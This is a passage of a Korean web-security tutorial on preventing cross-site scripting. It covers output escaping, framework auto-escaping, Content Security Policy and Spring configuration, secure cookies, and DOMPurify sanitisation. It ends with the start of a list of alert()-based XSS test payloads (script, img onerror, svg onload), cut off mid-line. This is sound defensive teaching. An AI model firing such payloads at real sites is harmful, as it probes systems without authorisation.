&#125;;</span><br><span class="line">  <span class="keyword">return</span> text.<span class="title function_">replace</span>(<span class="regexp">/[&amp;&lt;&gt;&quot;&#x27;/]/g</span>, <span class="function"><span class="params">char</span> =&gt;</span> map[char]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 사용 예시</span></span><br><span class="line"><span class="keyword">const</span> userInput = <span class="string">&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> safe = escapeHtml(userInput);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(safe);</span><br><span class="line"><span class="comment">// &amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;&amp;#x2F;script&amp;gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-출력-인코딩-Output-Encoding"><a href="#2-출력-인코딩-Output-Encoding" class="headerlink" title="2. 출력 인코딩 (Output Encoding)"></a>2. 출력 인코딩 (Output Encoding)</h3><h4 id="템플릿-엔진-자동-이스케이프"><a href="#템플릿-엔진-자동-이스케이프" class="headerlink" title="템플릿 엔진 자동 이스케이프"></a>템플릿 엔진 자동 이스케이프</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Thymeleaf (Spring) - 기본적으로 이스케이프 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;userInput&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 결과: &amp;lt;script&amp;gt;alert(&#x27;XSS&#x27;)&amp;lt;/script&amp;gt; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- HTML 그대로 출력 (위험!) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:utext</span>=<span class="string">&quot;$&#123;userInput&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 결과: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; ⚠️ 실행됨! --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// React - 기본적으로 이스케이프</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Comment</span>(<span class="params">&#123; text &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;text&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  <span class="comment">// 자동으로 HTML 엔티티로 변환</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 위험한 방법 (사용 금지)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">DangerousComment</span>(<span class="params">&#123; html &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:</span> <span class="attr">html</span> &#125;&#125; /&gt;</span></span>;</span><br><span class="line">  <span class="comment">// ⚠️ XSS 취약점 발생!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Vue.js - 기본적으로 이스케이프 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; userInput &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;!-- 안전: HTML 엔티티로 변환 --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;div v-html=&quot;userInput&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;!-- ⚠️ 위험: HTML 그대로 렌더링 --&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Content-Security-Policy-CSP"><a href="#3-Content-Security-Policy-CSP" class="headerlink" title="3. Content Security Policy (CSP)"></a>3. Content Security Policy (CSP)</h3><p>브라우저에게 “어떤 스크립트를 실행할지” 알려주는 보안 정책입니다.</p>
+<h4 id="CSP-헤더-설정"><a href="#CSP-헤더-설정" class="headerlink" title="CSP 헤더 설정"></a>CSP 헤더 설정</h4><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;;</span><br><span class="line">                         script-src &#x27;self&#x27; https://trusted-cdn.com;</span><br><span class="line">                         style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;</span><br><span class="line">                         img-src &#x27;self&#x27; data: https:;</span><br><span class="line">                         connect-src &#x27;self&#x27; https://api.example.com;</span><br><span class="line">                         font-src &#x27;self&#x27; https://fonts.googleapis.com;</span><br><span class="line">                         object-src &#x27;none&#x27;;</span><br><span class="line">                         base-uri &#x27;self&#x27;;</span><br><span class="line">                         form-action &#x27;self&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="CSP-디렉티브-설명"><a href="#CSP-디렉티브-설명" class="headerlink" title="CSP 디렉티브 설명"></a>CSP 디렉티브 설명</h4><table>
+<thead>
+<tr>
+<th>디렉티브</th>
+<th>설명</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>default-src</code></td>
+<td>모든 리소스의 기본 정책</td>
+</tr>
+<tr>
+<td><code>script-src</code></td>
+<td>JavaScript 실행 가능한 출처</td>
+</tr>
+<tr>
+<td><code>style-src</code></td>
+<td>CSS 출처</td>
+</tr>
+<tr>
+<td><code>img-src</code></td>
+<td>이미지 출처</td>
+</tr>
+<tr>
+<td><code>connect-src</code></td>
+<td>AJAX, WebSocket 연결 허용 출처</td>
+</tr>
+<tr>
+<td><code>font-src</code></td>
+<td>폰트 출처</td>
+</tr>
+<tr>
+<td><code>object-src</code></td>
+<td><code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code> 태그 출처</td>
+</tr>
+<tr>
+<td><code>base-uri</code></td>
+<td><code>&lt;base&gt;</code> 태그 제한</td>
+</tr>
+<tr>
+<td><code>form-action</code></td>
+<td>폼 제출 가능한 URL</td>
+</tr>
+</tbody></table>
+<h4 id="CSP-특수-값"><a href="#CSP-특수-값" class="headerlink" title="CSP 특수 값"></a>CSP 특수 값</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#x27;none&#x27;              - 모든 출처 차단</span><br><span class="line">&#x27;self&#x27;              - 같은 도메인만 허용</span><br><span class="line">&#x27;unsafe-inline&#x27;     - 인라인 스크립트/스타일 허용 (⚠️ 위험)</span><br><span class="line">&#x27;unsafe-eval&#x27;       - eval() 사용 허용 (⚠️ 위험)</span><br><span class="line">&#x27;strict-dynamic&#x27;    - Nonce/Hash로 로드된 스크립트가 생성한 스크립트 허용</span><br><span class="line">&#x27;nonce-&lt;random&gt;&#x27;    - 특정 난수를 가진 스크립트만 허용</span><br><span class="line">&#x27;sha256-&lt;hash&gt;&#x27;     - 특정 해시를 가진 스크립트만 허용</span><br></pre></td></tr></table></figure>
+
+<h4 id="Spring-Boot-CSP-설정"><a href="#Spring-Boot-CSP-설정" class="headerlink" title="Spring Boot CSP 설정"></a>Spring Boot CSP 설정</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            .headers(headers -&gt; headers</span><br><span class="line">                .contentSecurityPolicy(csp -&gt; csp</span><br><span class="line">                    .policyDirectives(</span><br><span class="line">                        <span class="string">&quot;default-src &#x27;self&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;script-src &#x27;self&#x27; &#x27;nonce-&#123;nonce&#125;&#x27; https://cdn.jsdelivr.net; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;img-src &#x27;self&#x27; data: https:; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;font-src &#x27;self&#x27; https://fonts.googleapis.com; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;connect-src &#x27;self&#x27; https://api.example.com; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;frame-ancestors &#x27;none&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;base-uri &#x27;self&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;form-action &#x27;self&#x27;&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Nonce-기반-CSP-권장"><a href="#Nonce-기반-CSP-권장" class="headerlink" title="Nonce 기반 CSP (권장)"></a>Nonce 기반 CSP (권장)</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Controller</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/page&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">page</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">nonce</span> <span class="operator">=</span> generateRandomNonce();</span><br><span class="line">    model.addAttribute(<span class="string">&quot;cspNonce&quot;</span>, nonce);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;page&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Nonce 생성</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">generateRandomNonce</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] nonceBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">SecureRandom</span>().nextBytes(nonceBytes);</span><br><span class="line">    <span class="keyword">return</span> Base64.getEncoder().encodeToString(nonceBytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Thymeleaf 템플릿 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">th:content</span>=<span class="string">&quot;&#x27;script-src &#x27;&#x27;nonce-&#x27; + $&#123;cspNonce&#125; + &#x27;&#x27;&#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Nonce 속성이 있는 스크립트만 실행됨 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">th:nonce</span>=<span class="string">&quot;$&#123;cspNonce&#125;&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;This script will execute&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- Nonce가 없으면 차단됨 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;This will be blocked&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-HTTPOnly-Secure-쿠키"><a href="#4-HTTPOnly-Secure-쿠키" class="headerlink" title="4. HTTPOnly &amp; Secure 쿠키"></a>4. HTTPOnly &amp; Secure 쿠키</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session_id=abc123;</span><br><span class="line">            HttpOnly;        # JavaScript로 접근 불가</span><br><span class="line">            Secure;          # HTTPS에서만 전송</span><br><span class="line">            SameSite=Strict  # CSRF 방어</span><br></pre></td></tr></table></figure>
+
+<h4 id="Spring-Boot-설정"><a href="#Spring-Boot-설정" class="headerlink" title="Spring Boot 설정"></a>Spring Boot 설정</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.yml</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">session:</span></span><br><span class="line">      <span class="attr">cookie:</span></span><br><span class="line">        <span class="attr">http-only:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">secure:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">same-site:</span> <span class="string">strict</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Java 코드로 쿠키 설정</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/login&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;?&gt; login(<span class="meta">@RequestBody</span> LoginDto dto, HttpServletResponse response) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sessionId</span> <span class="operator">=</span> authService.login(dto);</span><br><span class="line"></span><br><span class="line">    <span class="type">ResponseCookie</span> <span class="variable">cookie</span> <span class="operator">=</span> ResponseCookie.from(<span class="string">&quot;session_id&quot;</span>, sessionId)</span><br><span class="line">            .httpOnly(<span class="literal">true</span>)</span><br><span class="line">            .secure(<span class="literal">true</span>)</span><br><span class="line">            .sameSite(<span class="string">&quot;Strict&quot;</span>)</span><br><span class="line">            .path(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">            .maxAge(Duration.ofHours(<span class="number">1</span>))</span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok().build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-라이브러리를-이용한-새니타이제이션"><a href="#5-라이브러리를-이용한-새니타이제이션" class="headerlink" title="5. 라이브러리를 이용한 새니타이제이션"></a>5. 라이브러리를 이용한 새니타이제이션</h3><h4 id="DOMPurify-JavaScript"><a href="#DOMPurify-JavaScript" class="headerlink" title="DOMPurify (JavaScript)"></a>DOMPurify (JavaScript)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">DOMPurify</span> <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 사용자 입력을 안전하게 정제</span></span><br><span class="line"><span class="keyword">const</span> dirty = <span class="string">&#x27;&lt;img src=x onerror=&quot;alert(\&#x27;XSS\&#x27;)&quot;&gt; &lt;b&gt;Hello&lt;/b&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(dirty);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(clean);</span><br><span class="line"><span class="comment">// 결과: &lt;img src=&quot;x&quot;&gt; &lt;b&gt;Hello&lt;/b&gt;</span></span><br><span class="line"><span class="comment">// onerror는 제거됨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 설정 옵션</span></span><br><span class="line"><span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(dirty, &#123;</span><br><span class="line">  <span class="attr">ALLOWED_TAGS</span>: [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;strong&#x27;</span>, <span class="string">&#x27;em&#x27;</span>],</span><br><span class="line">  <span class="attr">ALLOWED_ATTR</span>: [<span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="OWASP-Java-HTML-Sanitizer"><a href="#OWASP-Java-HTML-Sanitizer" class="headerlink" title="OWASP Java HTML Sanitizer"></a>OWASP Java HTML Sanitizer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.owasp.html.PolicyFactory;</span><br><span class="line"><span class="keyword">import</span> org.owasp.html.Sanitizers;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 기본 정책 사용</span></span><br><span class="line"><span class="type">PolicyFactory</span> <span class="variable">policy</span> <span class="operator">=</span> Sanitizers.FORMATTING</span><br><span class="line">        .and(Sanitizers.LINKS);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">unsafe</span> <span class="operator">=</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&lt;b&gt;Hello&lt;/b&gt;&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">safe</span> <span class="operator">=</span> policy.sanitize(unsafe);</span><br><span class="line">System.out.println(safe);</span><br><span class="line"><span class="comment">// 결과: &lt;b&gt;Hello&lt;/b&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 커스텀 정책</span></span><br><span class="line"><span class="type">PolicyFactory</span> <span class="variable">customPolicy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HtmlPolicyBuilder</span>()</span><br><span class="line">        .allowElements(<span class="string">&quot;p&quot;</span>, <span class="string">&quot;div&quot;</span>, <span class="string">&quot;span&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;strong&quot;</span>, <span class="string">&quot;em&quot;</span>)</span><br><span class="line">        .allowAttributes(<span class="string">&quot;href&quot;</span>).onElements(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">        .allowAttributes(<span class="string">&quot;class&quot;</span>).matching(Pattern.compile(<span class="string">&quot;[a-zA-Z0-9-_]+&quot;</span>))</span><br><span class="line">        .toFactory();</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-프레임워크-기본-보호-기능-활용"><a href="#6-프레임워크-기본-보호-기능-활용" class="headerlink" title="6. 프레임워크 기본 보호 기능 활용"></a>6. 프레임워크 기본 보호 기능 활용</h3><h4 id="React"><a href="#React" class="headerlink" title="React"></a>React</h4><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ✅ 안전 - 자동 이스케이프</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">SafeComponent</span>(<span class="params">&#123; userInput &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;userInput&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ❌ 위험 - 직접 HTML 삽입</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">DangerousComponent</span>(<span class="params">&#123; html &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:</span> <span class="attr">html</span> &#125;&#125; /&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 안전 - DOMPurify로 정제 후 사용</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">DOMPurify</span> <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">SafeHtmlComponent</span>(<span class="params">&#123; html &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:</span> <span class="attr">clean</span> &#125;&#125; /&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- ✅ 안전 - 자동 이스케이프 --&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; userInput &#125;&#125;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- ❌ 위험 - HTML 직접 렌더링 --&gt;</span><br><span class="line">  &lt;div v-html=&quot;userInput&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- ✅ 안전 - 정제 후 사용 --&gt;</span><br><span class="line">  &lt;div v-html=&quot;sanitizedInput&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import DOMPurify from &#x27;dompurify&#x27;;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  props: [&#x27;userInput&#x27;],</span><br><span class="line">  computed: &#123;</span><br><span class="line">    sanitizedInput() &#123;</span><br><span class="line">      return DOMPurify.sanitize(this.userInput);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="🎯-실전-방어-전략"><a href="#🎯-실전-방어-전략" class="headerlink" title="🎯 실전 방어 전략"></a>🎯 실전 방어 전략</h2><h3 id="계층별-방어-Defense-in-Depth"><a href="#계층별-방어-Defense-in-Depth" class="headerlink" title="계층별 방어 (Defense in Depth)"></a>계층별 방어 (Defense in Depth)</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.</span> <span class="string">입력</span> <span class="string">단계</span></span><br><span class="line">   <span class="string">✅</span> <span class="string">클라이언트</span> <span class="string">측</span> <span class="string">검증</span> <span class="string">(UX</span> <span class="string">개선용)</span></span><br><span class="line">   <span class="string">✅</span> <span class="string">서버</span> <span class="string">측</span> <span class="string">검증</span> <span class="string">(필수)</span></span><br><span class="line">   <span class="string">✅</span> <span class="string">화이트리스트</span> <span class="string">기반</span> <span class="string">검증</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="string">.</span> <span class="string">저장</span> <span class="string">단계</span></span><br><span class="line">   <span class="string">✅</span> <span class="string">인코딩된</span> <span class="string">형태로</span> <span class="string">저장</span></span><br><span class="line">   <span class="string">✅</span> <span class="string">DB</span> <span class="string">파라미터</span> <span class="string">바인딩</span> <span class="string">사용</span> <span class="string">(SQL</span> <span class="string">Injection</span> <span class="string">방어)</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="string">.</span> <span class="string">출력</span> <span class="string">단계</span></span><br><span class="line">   <span class="string">✅</span> <span class="string">템플릿</span> <span class="string">엔진</span> <span class="string">자동</span> <span class="string">이스케이프</span></span><br><span class="line">   <span class="string">✅</span> <span class="string">Context-aware</span> <span class="string">인코딩</span></span><br><span class="line">   <span class="string">✅</span> <span class="string">DOMPurify</span> <span class="string">등</span> <span class="string">라이브러리</span> <span class="string">활용</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span><span class="string">.</span> <span class="string">브라우저</span> <span class="string">단계</span></span><br><span class="line">   <span class="string">✅</span> <span class="string">CSP</span> <span class="string">헤더</span> <span class="string">설정</span></span><br><span class="line">   <span class="string">✅</span> <span class="string">HttpOnly</span> <span class="string">쿠키</span></span><br><span class="line">   <span class="string">✅</span> <span class="string">X-XSS-Protection</span> <span class="string">헤더</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Context-aware-인코딩"><a href="#Context-aware-인코딩" class="headerlink" title="Context-aware 인코딩"></a>Context-aware 인코딩</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML Context</span></span><br><span class="line"><span class="keyword">const</span> htmlEncoded = escapeHtml(userInput);</span><br><span class="line">element.<span class="property">textContent</span> = htmlEncoded;</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScript Context</span></span><br><span class="line"><span class="keyword">const</span> jsEncoded = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(userInput);</span><br><span class="line"><span class="keyword">const</span> script = <span class="string">`var name = <span class="subst">$&#123;jsEncoded&#125;</span>;`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// URL Context</span></span><br><span class="line"><span class="keyword">const</span> urlEncoded = <span class="built_in">encodeURIComponent</span>(userInput);</span><br><span class="line"><span class="keyword">const</span> url = <span class="string">`https://example.com/search?q=<span class="subst">$&#123;urlEncoded&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CSS Context (사용 최소화)</span></span><br><span class="line"><span class="keyword">const</span> cssEncoded = userInput.<span class="title function_">replace</span>(<span class="regexp">/[&lt;&gt;&quot;&#x27;]/g</span>, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="Spring-Security-헤더-설정"><a href="#Spring-Security-헤더-설정" class="headerlink" title="Spring Security 헤더 설정"></a>Spring Security 헤더 설정</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            .headers(headers -&gt; headers</span><br><span class="line">                <span class="comment">// XSS 보호</span></span><br><span class="line">                .xssProtection(xss -&gt; xss</span><br><span class="line">                    .headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK)</span><br><span class="line">                )</span><br><span class="line">                <span class="comment">// CSP</span></span><br><span class="line">                .contentSecurityPolicy(csp -&gt; csp</span><br><span class="line">                    .policyDirectives(</span><br><span class="line">                        <span class="string">&quot;default-src &#x27;self&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;script-src &#x27;self&#x27; &#x27;nonce-&#123;nonce&#125;&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;img-src &#x27;self&#x27; data: https:; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;frame-ancestors &#x27;none&#x27;&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                <span class="comment">// 기타 보안 헤더</span></span><br><span class="line">                .frameOptions(frame -&gt; frame.deny())</span><br><span class="line">                .contentTypeOptions(Customizer.withDefaults())</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="🧪-XSS-공격-테스트"><a href="#🧪-XSS-공격-테스트" class="headerlink" title="🧪 XSS 공격 테스트"></a>🧪 XSS 공격 테스트</h2><h3 id="페이로드-예시"><a href="#페이로드-예시" class="headerlink" title="페이로드 예시"></a>페이로드 예시</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 기본 스크립트 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 이미지 태그 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- SVG 태그 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 이벤트 핸들러 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span 